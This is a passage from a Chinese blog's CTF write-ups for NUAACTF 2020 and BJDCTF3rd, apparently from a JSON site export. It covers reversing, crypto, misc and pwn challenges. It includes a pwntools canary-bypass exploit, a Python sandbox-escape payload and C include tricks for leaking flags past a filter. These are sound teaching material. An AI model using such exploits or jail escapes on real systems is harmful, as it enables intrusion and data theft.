--with-quiche=$PWD/../quiche/target/release --enable-alt-svc make 上面 build 过程中需要自行安装 cargo、CMake、Go、autoconf、libtoolize 等依赖，或者根据报错信息相应进行安装就好。（一环套一环，绝了 比如 CMake 报错找不到 Go： sudo apt install golang 再比如报错需要 autoconf、libtoolize： sudo apt install autoconf sudo apt install libtoolize 然而国内出口速度不行，在本地在国内的服务器上都试了，装了几个小时 curl 到比赛结束都没装上，代码半天拉不下来。后来直接下载仓库 ZIP 再装，build 还要下载新东西？？？好气啊！做题的时候超想找个 curl 编译有 http3 的小伙伴。。（看来打CTF整个国外VPS来跑很有必要 安装好之后就可以试试了，比如看看版本信息。（要用 build 好的 curl） ./curl --version 这题 curl 出来是一个web题…… ./curl -v https://106.14.153.173:8443 --http3 提示访问check.php. ./curl -v https://106.14.153.173:8443/check.php --http3 得到一道题，PHP的。 &lt;code&gt;&lt;span style=\"color: #000000\"&gt; &lt;span style=\"color: #0000BB\"&gt;&amp;lt;?php&lt;br /&gt;&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;include&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #DD0000\"&gt;'flag.php'&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;;&lt;br /&gt;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;error_reporting&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;0&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;);&lt;br /&gt;if&amp;nbsp;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$_SERVER&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;[&lt;/span&gt;&lt;span style=\"color: #DD0000\"&gt;\"REQUEST_METHOD\"&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;]&amp;nbsp;==&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #DD0000\"&gt;\"POST\"&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;)&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;extract&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$_POST&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;);&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if&amp;nbsp;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$pass&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;==&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$newpass&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;)&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;echo&amp;nbsp;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;$flag&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;}&lt;br /&gt;&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;highlight_file&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;(&lt;/span&gt;&lt;span style=\"color: #0000BB\"&gt;__FILE__&lt;/span&gt;&lt;span style=\"color: #007700\"&gt;);&lt;br /&gt;&lt;/span&gt; &lt;/span&gt; &lt;/code&gt; 传入两个参数pass和newpass，让它俩的值相等就行了。 ./curl -v https://106.14.153.173:8443/check.php --http3 -d \"pass=1&amp;newpass=1\" 然后得到flag： NUAACTF{WH4T_d0_y0u_kn0w_H334} 另一种 curl 方法想到一个方案，就是直接拉别人构建好的 docker 镜像。 找到了一个 build 有 HTTP3 的 curl docker image：ymuski/curl-http3 Docker image of curl compiled with BoringSSL and quiche/0.2.0 for HTTP3 support, httpstat for visualization. GitHub 仓库：**curl-http3** # docker run -it --rm ymuski/curl-http3 curl -V curl 7.71.0-DEV (x86_64-pc-linux-gnu) libcurl/7.71.0-DEV BoringSSL quiche/0.4.0 Release-Date: [unreleased] Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp Features: alt-svc AsynchDNS HTTP3 HTTPS-proxy IPv6 Largefile NTLM NTLM_WB SSL UnixSockets 而后直接做题就完事了。 docker run -it --rm ymuski/curl-http3 curl -Lv https://106.14.153.173:8443/check.php --http3 -d \"pass=a&amp;newpass=a\" Revrev1-xorpyc 反编译（可以利用这个工具） from flag import flag s = 'qwertyuiopasdfghjklzxcvbnm1234567890' for x in range(0, len(flag)): print(ord(s[x]) ^ ord(flag[x]), ' ', **None) 哇呜，最简单的异或，直接异或回去就完事了。 Exp: encrypted = \"31 2 4 19 23 13 19 18 24 31 22 44 29 9 18 55 9 10 2 37 10 6 23 14 2 20 110 86 82 90 86 83 74\" s = 'qwertyuiopasdfghjklzxcvbnm1234567890' m = encrypted.split(' ') m=list(map(int,m)) print(m) for x in range(0, len(m)): print(chr(ord(s[x]) ^ m[x]), end=\"\") nuaactf{wow_you_can_really_dance} rev2-demium encrypt是flag用medium加密来的，尝试逆向它吧 看了看逆向，好像有点复杂。 试了一下，发现flag和encrypt.txt中的头4个字母对应的。于是直接借用这个程序建立一个密码映射关系就完事了。 python 写一波jio本。 Exp： # -*- coding:utf-8 -*- m = r\"W1og39p2Kp+2_Zpx2{/yF\" s = r\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!@#$%^&amp;*()_+\" e = r\"oLlQfWgThE_1-ZpsUHMS+ex6K\\tP{9I}Jn8C4/kmcd5yBAz0RDaVrwuGvNjqOYi===========2b\" flag = '' for i in m: index = e.find(i) # print(e.find(i)) if index &gt;= 0: single = s[index] # print(single) flag += single print(flag) # flagDo_you_know_CLR （exp中没有写{ }的对应关系，问题不大 得到 flag: flag{Do_you_know_CLR} CryptoCrypto1-贝斯base64 一波完事 crypto4-RREAL_RSA哇呜，有直接了当的 RSA！ Public key: e=65537, n=1106081963347301781444155926534938643298217639670251381867474826890728970307 Encrypted flag: c=681873475888907291485502809441689140305197371659486141705279050132490452420 大整数N分解得到两个质数： 6598638704725743849027686163703739789 167622749606696848477732277529837832463 本地跑了半天没跑出来，拿去 http://factordb.com/ 这里分解就好了。 计算D再解密C即可得到flag flag{Here_Is_R4a1_Rs@} PWNpwn1按刘师傅意思，果然有签到题。 直接nc就出来了 pwn3改v2绕过 cannary 把v2改成 0x40 Exp: from pwn import * context.log_level = 'debug' c = remote('49.235.243.206', 10503) #c = process('./33') #gdb.attach(c) sysaddr = 0x004007FB payload = '' payload +=p64(sysaddr) c.send('a'*0x20) sleep(1) c.send(p64(0x40)) sleep(1) c.sendline(payload) c.interactive() 小结其实现在感觉做出来的题目还算很常规的，大都是常用的套路罢了。 毕竟是校赛，本身校内玩这个的也不多，题目的话自然相对于外面而言友好多了。 不过话说回来，这次比赛难度稍大的题目还是挺有意思的，甚至网上还没有过相关的思路，出题师傅们也挺费心血了。 有的题目有了思路，现场查了半天资料还做不出 flag 来，这时候就挺绝望的。 （还有比如为了一个题用 http3 装了几个小时 curl 到比赛结束都没装上，代码半天拉不下来气死我了 还要感谢队友一起冲呀！也算是一个小心愿实现了吧嘻嘻嘻。 可能这就是 CTF 的魅力吧。 就先这样了8，后面有空再来复现喵~ （溜了喵","path":"2020/05/30/CTF_2020NUAACTF/"},{"title":"CTF | DASCTF May & BJDCTF3rd 部分WriteUp","text":"引言 哇呜，转眼间一个月又过去了。这个月事情挺多的，当然也比较懒，一直咕着没来更新博客。 前两天水了一下 DASCTF 五月赛 &amp; BJDCTF3rd，这次不是新生赛了，还是和企业合办的，于是难度大的亚批，打得都自闭了。（没理由吹新生赛了嘤嘤嘤。 有一种好久没打 CTF 的感觉，这次上手挺生疏的（？ 题目看上去挺多的，确实也是，然而就不怎么会做嘛。（摊手 官方问题汇总文档见这里。（包括 hint 等） 这次主要来看看 Misc 题吧，其他的随意看看好了。（反正也不会做 比赛结束后题目环境已经关了，随便写写8. Reverseblink 一闪一闪亮晶晶~(请将flag经过md5后提交) hint1: 完整的图案可以扫一扫 hint2: http://taqini.space/2020/04/30/shell-output-control-code hint3: 此题有多种解法，不一定要硬把flag逆出来 这题本来是想逆向解的，就是他用了不少输出控制码，看了一下挺复杂的。 可以扫一扫，明确就是二维码之类的了。 一闪一闪的，突然想到截图然后叠加就好了呀！ 断开连接后再一看，他的实现是一屏一屏刷的，每一次记录都保留在终端里，直接终端里复制结果，再写个 jio 本就好了呀！ Exp： python大法好呀！ 我这里分别复制了10次闪烁的结果到文件里，考虑10次应该够了。 图形是25*25的，用一个矩阵来存是0还是1. 之后再转换到 [0, 255] uint8 类型，用 PIL 作图好了。 # -*- coding:utf-8 -*- from PIL import Image import numpy as np table = np.zeros((25, 25), dtype=int) # print(table) for i in range(1, 11): with open('{}.txt'.format(i), 'r', encoding='utf-8') as fin: row = 0 while row &lt; 25: line = fin.readline() print(line) for j in range(0, 49, 2): if line[j] == 'x': table[row][j//2] = 1 row += 1 a = [[0 if b == 0 else 255 for b in row] for row in table] qrcode = Image.fromarray(np.uint8(np.array(a))) qrcode.show() qrcode.save('qrcode.png') 这里图片反色了还有点小啊哈哈哈。问题不大，放大来扫就是了。 扫码得到 BJD{TW1NKLE_TW1NKLE_L1TTLE_5TAR} 真是一闪一闪亮晶晶~ MD5 后得到 e1eded5a7f630a2d02d3fe17b786919a 哇好耶，这题好难得啊，是 17 个做出来的之一唉。 MiscQuestionnaire 叮~ 您有一份调查问卷~ 请查收~ https://forms.gle/Vmzt99LazrtXsRLM9 flag格式：32位字符串 关于问卷问题答案：请使用英文或拼音作答。 问卷第七题hint 离中国科学院大学最近的长城 答案为长城名字的拼音，例如: Badaling 答对每题都会提示flag的一部分 Flag一共7部分 除了大学和公园外 其余题目都是拼音 这是什么签到题？？？ 最开始以为是填了之后放flag的，发现并不是。 填了几个发现错误提示，和 TaQini 师傅 py 了一下，果然是一个题给一部分 flag，最后连起来。（不过到最后也放 hint 了哈哈哈 借助百度识图、搜狗识图、谷歌识图，好不容易才整明白是啥。。（感觉找个老北京人要快得多呢2333 图片分别对应着： BIT 北理工 d41d 好邻居 8cd9 稻香村 8f00b2 jingweizhai 04e9 Jingshan Park 景山公园 8009 chaoyang 朝阳 98ecf8 hefangkou 河防口 427e （最后这个长城查了半天，搜索引擎告诉我怀柔区的长城是慕田峪（确实）。。后来和 TaQini 师傅聊到说这是个鲜为人知的长城…… 连起来得到 flag： d41d8cd98f00b204e9800998ecf8427e P.S.: 后面查不出来在网页里一搜，发现还是谷歌的套路，是用 JavaScript 传入的数据。里面就有匹配的逻辑了。 （还是 F12 大法好呀！ var FB_PUBLIC_LOAD_DATA_ = [null,[\"Let's see how well you know our Capital.\",[[1790362738,\"What is the name of this university?\",null,0,[[336510603,null,0,null,[[4,302,[\"Beijing Institute of Technology|BIT\"] ,\"d41d\"] ] ] ] ,null,null,null,null,[[\"1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w\",null,[740,416,0] ] ] ] ,[603160739,\"What is the name of the store?\",null,0,[[539054317,null,0,null,[[4,302,[\"Haolinju|haolinju\"] ,\"8cd9\"] ] ] ] ,null,null,null,null,[[\"1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q\",null,[740,416,0] ] ] ] ,[488094967,\" What BRAND is this food?\",null,0,[[1465781074,null,0,null,[[4,302,[\"Daoxiangcun|daoxiangcun\"] ,\"8f00b2\"] ] ] ] ,null,null,null,null,[[\"1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw\",null,[375,458,1] ] ] ] ,[1097246628,\"Which RESTAURANT are the ducks coming from? \",null,0,[[353762320,null,0,null,[[4,302,[\"Jingweizhai|jingweizhai\"] ,\"04e9\"] ] ] ] ,null,null,null,null,[[\"11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw\",null,[740,555,0] ] ] ] ,[1916058196,\"Which PARK is this?\",null,0,[[901636349,null,0,null,[[4,302,[\"Jingshan|jingshan\"] ,\"8009\"] ] ] ] ,null,null,null,null,[[\"16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ\",null,[740,554,0] ] ] ] ,[1044111735,\"Which DISTRICT is the No.3 of Beijing?\",\"The restaurant in question4 is in this Distric\",0,[[1620980704,null,0,null,[[4,302,[\"Chaoyang|chaoyang\"] ,\"98ecf8\"] ] ] ] ,null,null,null,null,[[\"1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g\",null,[740,371,0] ] ] ] ,[1877231084,\"Which part of the Great Wall is this?\",\"In Huairou Distric\",0,[[1337434564,null,0,null,[[4,302,[\"Hefangkou|hefangkou\"] ,\"427e\"] //... /bin/cat 2 [CAUTION] cats as numerous as stars are coming… 解出的答案经md5后提交~ 有两种喵喵，还是动图唉，远着看就是二维码嘛！（果然是 TaQini 师傅出的题 首先把宽度压缩到原来一半，本来想 python 写个jio本的，PIL 感觉有点麻烦还不大会。 于是一波骚操作重新上个色好了。（你肯定想不到我是在 word 中处理的吧，嘿嘿嘿 PS 也行，Stegsolve 里 gif 截取一帧然后丢去取某通道某 bit 信息/随机上色/etc. 都行。 扫码得到 m1ao~miao~mi@o~Mia0~m!aO~m1a0~~~ 喵喵喵喵喵喵~ md5加密得到32位flag。 9b84eb9e7107ffafebeb1000e8c05322 （看到还真有手搓二维码的 tql test your nc 183.129.189.60:10118,10119,10120,10121,10122,10123 hint1: /f1a9.bak 你看到了嘛? hint2: 用df命令看看硬盘总共多大，再看看flag多大。 hint3: 系统命令不够使？试试万能的python 先来看看 /f1a9.bak。 $ cat /f1a9.bak #!/usr/bin/python #coding=utf-8 from random import randint from uuid import uuid4 flag = [hex(i)[2:-1] for i in uuid4().fields] f=open('/home/ctf/flag','w') f.write('🐀') f.seek(1024*1024*1024) f.write('flag{') offset = 1024 for i in flag: f.seek(1024*1024*1024*randint(offset,offset+2048)) offset += 2048 f.write(i) f.write('}') f.seek(1024*1024*1024*randint(offset,offset+2048)) f.write('good job!') f.close() 这里的uuid正好就查了一下。 UUID: 通用唯一标识符 ( Universally Unique Identifier ), 对于所有的UUID它可以保证在空间和时间上的唯一性. 它是通过MAC地址, 时间戳, 命名空间, 随机数, 伪随机数来保证生成ID的唯一性, 有着固定的大小( 128 bit ). 它的唯一性和一致性特点使得可以无需注册过程就能够产生一个新的UUID. UUID可以被用作多种用途, 既可以用来短时间内标记一个对象, 也可以可靠的辨别网络中的持久性对象. python 的 uuid 模块提供UUID类和函数uuid1(), uuid3(), uuid4(), uuid5() 来生成1, 3, 4, 5各个版本的UUID ( 需要注意的是: python中没有uuid2()这个函数). 对uuid模块中最常用的几个函数总结如下: uuid.uuid1([node[, clock_seq]]) : 基于时间戳 使用主机ID, 序列号, 和当前时间来生成UUID, 可保证全球范围的唯一性. 但由于使用该方法生成的UUID中包含有主机的网络地址, 因此可能危及隐私. 该函数有两个参数, 如果 node 参数未指定, 系统将会自动调用 getnode() 函数来获取主机的硬件地址. 如果 clock_seq 参数未指定系统会使用一个随机产生的14位序列号来代替. uuid.uuid3(namespace, name) : 基于名字的MD5散列值 通过计算命名空间和名字的MD5散列值来生成UUID, 可以保证同一命名空间中不同名字的唯一性和不同命名空间的唯一性, 但同一命名空间的同一名字生成的UUID相同. uuid.uuid4() : 基于随机数 通过随机数来生成UUID. 使用的是伪随机数有一定的重复概率. uuid.uuid5(namespace, name) : 基于名字的SHA-1散列值 通过计算命名空间和名字的SHA-1散列值来生成UUID, 算法与 uuid.uuid3() 相同. （来自网络） 看来是在 1024*1024*1024*randint(offset,offset+2048) 的随机位置写入了flag。 再来看看硬盘大小和文件大小。 $ df Filesystem 1K-blocks Used Available Use% Mounted on overlay 16197544 2011556 14169604 13% / tmpfs 65536 0 65536 0% /dev tmpfs 507956 0 507956 0% /sys/fs/cgroup /dev/vda1 16197544 2011556 14169604 13% /etc/hosts shm 65536 0 65536 0% /dev/shm tmpfs 507956 0 507956 0% /proc/acpi tmpfs 507956 0 507956 0% /proc/scsi tmpfs 507956 0 507956 0% /sys/firmware $ ls -al total 64 drwxr-x--- 1 root ctf 4096 May 22 06:40 . drwxr-xr-x 1 root root 4096 May 19 03:09 .. -rwxr-x--- 1 root ctf 220 May 5 2019 .bash_logout -rwxr-x--- 1 root ctf 3771 May 5 2019 .bashrc -rwxr-x--- 1 root ctf 807 May 5 2019 .profile -rw-r----- 1 root ctf 16150150774793 May 22 06:40 flag -rw-r----- 1 root ctf 23 May 19 11:05 readme 硬盘这么小，怎么flag文件这么大（16TB+ ？？？），佛了。 这个 nc 有15s的时间限制，还有执行内存限制之类的。 试了一下没有strings，grep 出不来 flag。（被kill了？ 考虑到 hint 中提示可以用py来整。环境中只有py2. python -c \"open('./flag','r').read()\" 这样会炸内存。 考虑分块读取，然而好像又有限制。佛了。 20200605 更新： 看了看出题的 TaQini 师傅的出题笔记，这里顺便参考一下。 之所以生成的 flag 如此之大，是因为生成的脚本中的 seek 函数在将文件偏移的指针往后移动一段之后，在写入的有效数据（flag）之间留下了一个个由 \\x00 组成的空洞（hole），这些 hole 是不占用（不分配）磁盘空间的。因此题目中用df看硬盘空间还是很小的。 而用lseek函数能跳过 hole 去读取数据。 可以用 man lseek 来看看函数手册。 off_t lseek (int fd, off_t offset, int whence); The lseek() function repositions the offset of the open file associated with the file descriptor fd to the argument offset according to the directive whence. fd：文件描述符； offset: 移动文件位置的偏移数，以字节为单位； whence 为系统定义的常量，可能的值有SEEK_SET、SEEK_CUR、SEEK_END、SEEK_DATA、SEEK_HOLE。 SEEK_SET The offset is set to offset bytes. 文件读写位置从文件开始往后移动offset个字节。 SEEK_CUR The offset is set to its current location plus offset bytes. 文件读写位置从当前位置开始移动offset个字节。offset可以为负值。 SEEK_END The offset is set to the size of the file plus offset bytes. 文件读写位置从文件结尾移动offset个字节。offset可以为负值。 这里要用到的是 whence 参数为 SEEK_DATA，man 中还对空洞（hole）的原理作了解释。 Seeking file data and holes ​ Since version 3.1, Linux supports the following additional values for whence: SEEK_DATA Adjust the file offset to the next location in the file greater than or equal to offset containing data. If offset points to data, then the file offset is set to offset. SEEK_HOLE Adjust the file offset to the next hole in the file greater than or equal to offset. If offset points into the middle of a hole, then the file offset is set to offset. If there is no hole past offset, then the file offset is adjusted to the end of the file (i.e., there is an implicit hole at the end of any file). In both of the above cases, lseek() fails if offset points past the end of the file. These operations allow applications to map holes in a sparsely allocated file. This can be useful for applications such as file backup tools, which can save space when creating backups and preserve holes, if they have a mechanism for discovering holes. For the purposes of these operations, a hole is a sequence of zeros that (normally) has not been allocated in the underlying file storage. However, a filesystem is not obliged to report holes, so these operations are not a guaranteed mechanism for mapping the storage space actually allocated to a file. (Furthermore, a sequence of zeros that actually has been written to the underlying storage may not be reported as a hole.) In the simplest implementation, a filesystem can support the operations by making SEEK_HOLE always return the offset of the end of the file, and making SEEK_DATA always return offset (i.e., even if the location referred to by offset is a hole, it can be considered to consist of data that is a sequence of zeros). 大概也就是说，这些空洞是零序列，它们通常在底层文件存储中没有分配空间。 SEEK_DATA 是跳过 hole 寻找下一个数据，SEEK_HOLE是跳过数据寻找下一个 hole。 在 python 中的 os 模块也有lseek这个函数，于是可以用来写exp了。 考虑到没有环境了，这里利用/f1a9.bak中的内容在本地生成了一个 flag，而后参照 TaQini 师傅的脚本来读取 flag。 首先看一下 flag 有多大。 # ls -al total 56 drwxr-xr-x 2 root root 4096 6月 5 22:06 ./ drwxr-xr-x 8 root root 4096 6月 5 21:48 ../ -rw-r--r-- 1 root root 15007689474057 6月 5 21:48 flag 在命令行可以用 python -c &lt;command&gt; 来执行 py 语句，多行的话用三个引号引起来就完事了（我也才知道命令行也可以这样多行的嘤嘤嘤）。 Exp：（在命令行执行） python -c \"\"\" import os fd = os.open('/home/ctf/flag',0) off = 0 flag = '' while off &lt; 15007689474057: off = os.lseek(fd,off,3) # SEEK_DATA off += 1 a = os.read(fd,1) if a != '\\x00': flag += a print flag \"\"\" 即可得到flag了！ 这里还有另一种方法，那就是利用 grep 大法！ 看到有师傅说，用 grep -z 可以单行语句出 flag，不过没有具体给出如何实现，于是就自己试了一下。 看了看 grep --help 和 man grep： -z, –null-data 一个 0 字节的数据行，但不是空行 -z, –null-data Treat the input as a set of lines, each terminated by a zero byte (the ASCII NUL character) instead of a newline. Like the -Z or –null option, this option can be used with commands like sort -z to process arbitrary file names. -z就是说把零字符看成是输入的分行标志，可以理解是把 \\x00 当成分行符，正好就符合这题的意思了，妙呀！ 试了一阵子，发现可以这样来读取 flag 文件： grep -z \".\\+\" flag # Or grep -z \".\" flag 想不到吧，grep 还能这么用呢。 babyweb flag格式：把BJD{this_is_flag}转md5，提交md5值(小写) hint: 第三组密码中的某一位，以下图的解密结果为准： 百度图片搜出来的密码表是Q，以原著为准 改成w，再根据图片的提示改成W；如果还提交失败就是其他位有解错的。 有个flag.zip，里面有个图片密码加密了。 这题网页上看到那个 pass 和 word_is_here 之间的空字符还觉得奇怪，做题的时候就没想到是零宽度字符隐写（Zero-Width Space Steganography）……原来还有用到网页上的。 解密网站参考： http://zero.rovelast.com/ https://offdev.net/demos/zwsp-steg-js GitHub 仓库参考： zwsp-steg-py （基于 python 实现） zwsp-steg-js （基于 JavaScript 实现） 解出来密码是zerowidthcharactersinvisible。 拿去解压图片，发现文件倒序了。 （留坑，后面接着复现） manual 请使用ssh连接靶机（用户名为ctf，密码详见欢迎信息）———— 歡迎使用BJD3rd帮助手册————「manual一下，你就知道」 183.129.189.60:10125,10126,10127,10128,10129,10130 hint0 试试limux的man命令，看看与本题的man文档有何不同 hint0.5 关于登录密码，试试emoji网站的分享功能 hint1 本题无需提权，请仔细看看根目录下的文件 hint2 据说会ps的师傅都做出来了 hint3 f1a9.py的独白：我的真实身份是web server 这题有毒，做了一天没做出来……大概写写吧。 % ssh ctf@183.129.189.60 -p 10128 Welcome to BJD3rd Games ~ 🐀🐾🌴🚜🍋🐊🍇🐂🍓🎑🐈🐟💁🚟🍗 The above login passwd is encrypted. leads: - http://emoji.taqini.space - suika Try to figure out where is your # ##### ##### ###### ## ## # # # # # # # # # # # # ##### # # # ###### ### # # ###### # # # # # # # # # ##### # # ##### # p.s. Maybe you have lots of xiaowenhao after login, I will help u look up the manual pages of flag. Now, input passwd to start the game: http://emoji.taqini.space 是 TaQini 师傅部署的 codemoji 加解密网站。 suika在日语中是 西瓜 的意思，看来这就是 key 了。 随意试着加密了一个，在分享界面浏览器抓包得到分享链接形式为 http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BNi%2FCfjonwn4y38J%2BOkfCfjYvwn46J8J%2BMt%2FCfjpHwn42L8J%2BOifCfjLfwn46RIiwia2V5Ijoi8J%2BNiSJ9 data 参数 urldecode + base64 解码后得到 {\"message\":\"🍋🎉🌷🎑🍋🎉🌷🎑🍋🎉🌷🎑\",\"key\":\"🍉\"} 于是想到修改message参数构造 payload 如下。 {\"message\":\"🐀🐾🌴🚜🍋🐊🍇🐂🍓🎑🐈🐟💁🚟🍗\",\"key\":\"🍉\"} base64 encode + urlencode: eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9 构造分享链接得到： http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9 拿去解码。 得到ssh连接密码： C0dEmOj!so4UnNy 还别说，挺好看的233. 看了 Help 才发现这是 w3m。还带右键菜单的哇！ w3m是个开放源代码的文字式网页浏览器。 w3m支持表格、框架、SSL连线、颜色。如果是在适当的terminal上，甚至还支持“inline image”。 这个软件通常尽量呈现出网页本来的编排。 “w3m”这名字是来自“WWW-wo-Miru”，就是日文的“看WWW”之义。 哇是真的浏览器唉，还可以上我博客（雾），虽然解析不了中文嘤嘤嘤。 借助快捷键U分别访问givemeflag和 getflag。 HISTORY 里给了个网址 https://www.jianshu.com/p/ac26b4506a38 讲的是自定义man手册。 查看/etc/manpath.config文件。 对比一下好像并没有什么区别（？？？ 用 V 可以查看文件，但是找不到 f1a9.py？ Option 里可以改配置用外部浏览器打开，考虑是反弹 shell。 （不过么有 curl，不会了……嘤嘤嘤 （看大佬们是用 perl 整的。 这题后面还有好几步……有空再复现8. 最后是一个 http://999.taqini.space 太极？会玩。 PY me 请提交md5(“BJD{xxxx}”)； 使用nc连接； 尽量用后面的端口，10020端口不太稳定 183.129.189.60:10020,10021,10022,10023,10024,10026 flag格式为md5（BJD{.*}）上交md5值 使用nc连接靶机，建议用后面端口号 hint1: 所有没有使用hint()中给出的函数做出题目的方法都是非预期，如果您是非预期请报告我们，所以 从哪里入手应该懂了吧？ hint2: if( #s#o#m#e#t#h#i#n#g##I##w#o#n#t##t#e#l#l##y#o#u# ) 这过滤了全部字母和数字，当然还过滤了其他符号，需要自己fuzz（socket pwntool等) hint3: python几？ 打错字了，是result，不影响做题 题目给了 hint 说过滤了全部字母和数字，当然还过滤了其他符号。 试了发现不仅仅如此，常用的一下函数也被过滤了，比如 os，sys，open，lambda，system，exec，eval，builtins等等。 函数名称用字符串拼接可以绕过，但不知道用什么方法能绕过来调用函数了。 看了下 dir()，大概有这几个 False, __builtins__ , hint, rceMe。 题目中的 if False，直接令 False=True 就行，毕竟 python 里都是对象 object 2333. 本来想改 str 的，但怎么样都绕不过 if( #s#o#m#e#t#h#i#n#g#_#I#_#w#o#n#t#_#t#e#l#l#_#y#o#u# ) 这部分判断。 利用报错知道了源码文件名称为 bjdpyjail.py，不过好像没啥用。 考虑用字符来绕过，手动试验发现包括但不限于 ^.; 被过滤了。 说到这难受死了，有空得学学 pwntools，直接控制台手码代码太jr难受了，还不能快捷调用上一条执行命令，无法接受。 这么说来，异或 ^ 不行，但取反 ~ 可以，&lt; &gt;也可。 查了一下网上有关于 PHP 的字符绕过，然而在 python 里不能直接对字符本身取反，要先取ord，然后想了半天都想不到该怎么绕了…… （摊手，等复现 赛后看到大佬找到了奇妙的绕过方法，把源码读取出来了。（详见 这里 ） vars(locals()['_'+'_buil'+'tins_'+'_'])[\"op\"+\"en\"]('bjdpyjail.py', 'r').read() 预期解详见出题师傅 Y1ng 师傅的这一篇： [译]PlaidCTF中一道PyJail逃逸题目分析 PwnTaQiniOJ-0 欢迎来到TaQini的C语言新手训练营 （没有附件，盲打） 183.129.189.60:10075,10076,10077,10078,10079,10080 这里告诉了flag所在目录为 /home/ctf/flag。 好久没写C了，突然都忘记文件操作了。被 python 的open惯坏了唉。 试了一下，还有 defender 唉。flag被过滤了。 #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(){ FILE *fp; char name[20]=\"/home/ctf/fl\"; char tmp[1000]={0}; printf(\"Hello TaQini\"); strcat(name,\"ag\"); printf(\"%s\\n\", name); fp=fopen(name,\"r\"); fscanf(fp, \"%s\", tmp); printf(\"%s\", tmp); fclose(fp); return 0; } @ 发现好像敏感词不仅仅是flag，还有home啥的……然而赛后才发现，气死我了。 可以sprintf来拼接字符串。 （想起来某次做项目给单片机编程就靠这玩意拼接字符串，被 python 惯坏的我写的难受死了。 sprintf(&amp;name, \"%s%s%s%s%s\", \"/hom\", \"e\",\"/ct\", \"f/f\", \"lag\"); 当然还可以直接用字符数组赋值的方法。 char name[15] = { '/','h','o','m','e','/','c','t','f','/','f','l','a','g','\\0' }; 赛后群里有大佬给出了如下的非预期解，太佩服了！ #include \"/home/ctf/fl\\\\ ag\" 哇呜，用报错来弹flag！虽然之前写错语法也报错了，但这脑洞真没想到。果然是 OJ 大佬。 同样漏洞可用于另一个 OJ 题。 Cryptobbcrypto# -*- coding:utf-8 -*- import A,SALT from itertools import * def encrypt(m, a, si): c=\"\" for i in range(len(m)): c+=hex(((ord(m[i])) * a + ord(next(si))) % 128)[2:].zfill(2) return c if __name__ == \"__main__\": m = 'flag{********************************}' a = A salt = SALT assert(len(salt)==3) assert(salt.isalpha()) si = cycle(salt.lower()) print(\"明文内容为：\") print(m) print(\"加密后的密文为：\") c=encrypt(m, a, si) print(c) #加密后的密文为： #177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d 通过assert可以知道salt是三个字母组成的。 cycle返回一个迭代器 iterator，每一次调用 next 返回下一个字符。 需要根据 flag{和 } 解出A和SALT，然后再代回去反解 flag 中的字符。取模的话想不到别的方法应该也是爆破解。 考虑是爆破来解A&amp; SALT，然而我a的爆破范围太大了设到了 1000 然后就没整出来……（（ 赛后看人家大佬解出来A是57，salt是ahh。 （之后再复现8 小结最终的解题情况如下。 Web 的小红花这么多人解出来，啊是我太菜了。题目把出网流量封了，弹不了shell，赛后看群里大佬们是用时间盲注怼出来的。 总之，这次题目质量感觉挺高的，难度是真的大得亚批，两天打下来每天都在自闭…… 这次做题思路比较乱，可能也比较佛系，一下看这题一下看那题，噢原来都不会做。（群里萌新又做出来了？？？打扰了。 然后还有大佬两周学会 pwn 然后做出了一堆题，这么容易入门的嘛，心动了。（算了8） CyberChef为了便于打 CTF，前天晚上做题途中自己搭了个 